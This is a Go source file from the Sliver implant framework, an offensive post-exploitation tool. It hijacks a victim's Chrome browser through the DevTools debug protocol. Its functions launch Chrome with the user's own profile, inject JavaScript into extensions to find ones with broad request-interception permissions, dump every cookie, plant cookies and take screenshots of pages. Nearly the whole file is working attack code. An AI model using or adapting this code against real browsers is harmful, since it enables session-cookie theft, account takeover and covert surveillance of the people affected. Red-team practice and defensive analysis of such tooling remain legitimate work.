package overlord

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"net/url"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/cdproto/target"
	"github.com/chromedp/chromedp"

	"github.com/bishopfox/sliver/client/core"
)

const (
	// AllURLs - All URLs permission
	AllURLs = "<all_urls>"

	// AllHTTP - All HTTP permission
	AllHTTP = "http://*/*"

	// AllHTTPS - All HTTP permission
	AllHTTPS = "https://*/*"

	// WebRequest - WebRequest permission
	WebRequest = "webRequest"

	// WebRequestBlocking - WebRequestBlocking permission
	WebRequestBlocking = "webRequestBlocking"

	// FetchManifestJS - Get extension manifest
	FetchManifestJS = "(() => { return chrome.runtime.getManifest(); })()"
)

var (
	// ErrTargetNotFound - Returned when a target cannot be found
	ErrTargetNotFound = errors.New("target not found")
)

// ManifestBackground - An extension manifest file
type ManifestBackground struct {
	Scripts    []string `json:"scripts"`
	Persistent bool     `json:"persistent"`
}

// Manifest - An extension manifest file
type Manifest struct {
	Name            string             `json:"name"`
	Version         string             `json:"version"`
	Description     string             `json:"description"`
	ManifestVersion int                `json:"manifest_version"`
	Permissions     []string           `json:"permissions"`
	Background      ManifestBackground `json:"background"`
}

// ChromeDebugTarget - A single debug context object
type ChromeDebugTarget struct {
	Description          string `json:"description"`
	DevToolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	Type                 string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

var allocCtx context.Context

func getContextOptions(userHomeDir string, platform string) []func(*chromedp.ExecAllocator) {
	opts := []func(*chromedp.ExecAllocator){
		chromedp.Flag("restore-last-session", true),
		chromedp.UserDataDir(userHomeDir),
	}
	switch platform {
	case "darwin":
		opts = append(opts,
			chromedp.Flag("headless", false),
			chromedp.Flag("use-mock-keychain", false),
		)
	default:
		opts = append(opts, chromedp.Headless)
	}
	opts = append(chromedp.DefaultExecAllocatorOptions[:], opts...)
	return opts
}

func GetChromeContext(webSocketURL string, curse *core.CursedProcess) (context.Context, context.CancelFunc, context.CancelFunc) {
	var (
		cancel context.CancelFunc
	)
	if webSocketURL != "" {
		allocCtx, cancel = chromedp.NewRemoteAllocator(context.Background(), webSocketURL)
	} else {
		opts := getContextOptions(curse.ChromeUserDataDir, curse.Platform)
		allocCtx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
	}
	taskCtx, taskCancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
	return taskCtx, taskCancel, cancel
}

func findTargetInfoByID(ctx context.Context, targetID string) *target.Info {
	targets, err := chromedp.Targets(ctx)
	if err != nil {
		return nil
	}
	for _, targetInfo := range targets {
		if targetInfo.TargetID.String() == targetID {
			return targetInfo
		}
	}
	return nil
}

func contains(haystack []string, needle string) bool {
	set := make(map[string]struct{}, len(haystack))
	for _, entry := range haystack {
		set[entry] = struct{}{}
	}
	_, ok := set[needle]
	return ok
}

func containsAll(haystack []string, needles []string) bool {
	all := true
	for _, needle := range needles {
		if !contains(haystack, needle) {
			all = false
			break
		}
	}
	return all
}

// ExecuteJS - injects a JavaScript code into a target
func ExecuteJS(ctx context.Context, string, targetID string, jsCode string) ([]byte, error) {
	targetInfo := findTargetInfoByID(ctx, targetID)
	if targetInfo == nil {
		return nil, ErrTargetNotFound
	}
	extCtx, _ := chromedp.NewContext(ctx, chromedp.WithTargetID(targetInfo.TargetID))
	var result []byte
	evalTasks := chromedp.Tasks{
		chromedp.Evaluate(jsCode, &result),
	}
	err := chromedp.Run(extCtx, evalTasks)
	return result, err
}

// FindExtensionWithPermissions - Find an extension with a permission
func FindExtensionWithPermissions(curse *core.CursedProcess, permissions []string) (*ChromeDebugTarget, error) {
	targets, err := QueryExtensionDebugTargets(curse.DebugURL().String())
	if err != nil {
		return nil, err
	}
	for _, target := range targets {
		ctx, _, _ := GetChromeContext(target.WebSocketDebuggerURL, curse)
		result, err := ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
		if err != nil {
			continue
		}
		manifest := &Manifest{}
		err = json.Unmarshal(result, manifest)
		if err != nil {
			continue
		}
		if containsAll(manifest.Permissions, permissions) {
			return &target, nil
		}
	}
	return nil, nil // No targets, no errors
}

// FindExtensionsWithPermissions - Find an extension with a permission
func FindExtensionsWithPermissions(curse *core.CursedProcess, permissions []string) ([]*ChromeDebugTarget, error) {
	targets, err := QueryExtensionDebugTargets(curse.DebugURL().String())
	if err != nil {
		return nil, err
	}
	extensions := []*ChromeDebugTarget{}
	for _, target := range targets {
		ctx, _, _ := GetChromeContext(target.WebSocketDebuggerURL, curse)
		result, err := ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
		if err != nil {
			continue
		}
		manifest := &Manifest{}
		err = json.Unmarshal(result, manifest)
		if err != nil {
			continue
		}
		if containsAll(manifest.Permissions, permissions) {
			extensions = append(extensions, &target)
		}
	}
	return extensions, nil
}

// QueryDebugTargets - Query debug listener using HTTP client
func QueryDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
	resp, err := http.Get(debugURL)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("non-200 status code")
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	debugContexts := []ChromeDebugTarget{}
	err = json.Unmarshal(data, &debugContexts)
	return debugContexts, err
}

// QueryExtensionDebugTargets - Query debug listener using HTTP client for Extensions only
func QueryExtensionDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
	resp, err := http.Get(debugURL)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("non-200 status code")
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	debugContexts := []ChromeDebugTarget{}
	err = json.Unmarshal(data, &debugContexts)
	if err != nil {
		return nil, err
	}
	extensionContexts := []ChromeDebugTarget{}
	for _, debugCtx := range debugContexts {
		ctxURL, err := url.Parse(debugCtx.URL)
		if err != nil {
			continue
		}
		if ctxURL.Scheme == "chrome-extension" {
			extensionContexts = append(extensionContexts, debugCtx)
		}
	}
	return extensionContexts, nil
}

// DumpCookies - Dump all cookies from the remote debug target
func DumpCookies(curse *core.CursedProcess, webSocketURL string) ([]*network.Cookie, error) {
	var cookies []*network.Cookie
	var err error
	dumpCookieTasks := chromedp.Tasks{
		// read network values
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err = storage.GetCookies().Do(ctx)
			if err != nil {
				return err
			}
			return nil
		}),
	}
	taskCtx, taskCancel, cancel := GetChromeContext(webSocketURL, curse)
	defer taskCancel()
	defer cancel()
	ctx, _ := chromedp.NewContext(taskCtx)
	if err := chromedp.Run(ctx, dumpCookieTasks); err != nil {
		return cookies, err
	}
	return cookies, nil
}

func SetCookie(curse *core.CursedProcess, webSocketURL string, host string, cookies ...string) (string, error) {
	var res string
	setCookieTasks := chromedp.Tasks{
		chromedp.ActionFunc(func(ctx context.Context) error {
			// create cookie expiration
			expr := cdp.TimeSinceEpoch(time.Now().Add(180 * 24 * time.Hour))
			// add cookies to chrome
			for i := 0; i < len(cookies); i += 2 {
				err := network.SetCookie(cookies[i], cookies[i+1]).
					WithExpires(&expr).
					WithDomain("localhost").
					WithHTTPOnly(true).
					Do(ctx)
				if err != nil {
					return err
				}
			}
			return nil
		}),
		// navigate to site
		// chromedp.Navigate(host),
		// read the returned values
		// chromedp.Text(`#result`, &res, chromedp.ByID, chromedp.NodeVisible),
	}
	taskCtx, taskCancel, cancel := GetChromeContext(webSocketURL, curse)
	defer taskCancel()
	defer cancel()
	ctx, _ := chromedp.NewContext(taskCtx)
	if err := chromedp.Run(ctx, setCookieTasks); err != nil {
		return "", err
	}

	return res, nil
}

// Screenshot - Take a screenshot of a Chrome context
func Screenshot(curse *core.CursedProcess, webSocketURL string, targetID string, quality int64) ([]byte, error) {
	var result []byte
	screenshotTask := chromedp.Tasks{
		chromedp.ActionFunc(func(ctx context.Context) error {
			_, _, _, _, _, contentSize, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				return err
			}
			result, err = page.CaptureScreenshot().
				WithQuality(quality).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  1,
				}).Do(ctx)
			if err != nil {
				return err
			}
			return nil
		}),
	}

	taskCtx, taskCancel, cancel := GetChromeContext(webSocketURL, curse)
	defer taskCancel()
	defer cancel()
	targetInfo := findTargetInfoByID(taskCtx, targetID)
	if targetInfo == nil {
		return []byte{}, ErrTargetNotFound
	}
	ctx, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
	if err := chromedp.Run(ctx, screenshotTask); err != nil {
		return nil, err
	}
	return result, nil
}
